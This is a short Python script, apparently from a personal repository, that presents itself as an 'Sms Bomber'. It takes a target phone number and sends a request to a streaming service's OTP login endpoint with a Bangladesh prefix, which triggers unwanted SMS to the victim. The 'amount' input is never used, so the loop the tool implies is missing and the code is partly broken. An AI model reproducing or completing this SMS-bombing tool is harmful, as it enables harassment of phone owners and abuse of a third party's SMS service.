# Its-Rakib-
 Mr Rakib



import requests

#get

number=str(input(" Enter Your number: "))

amount=int(input(" Enter Your amount: "))



api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

type=("Hii, Welcome To My Sms Bomber Website ,To Continue My Tool & Enjoy This")

print(type)

requests.get(api)
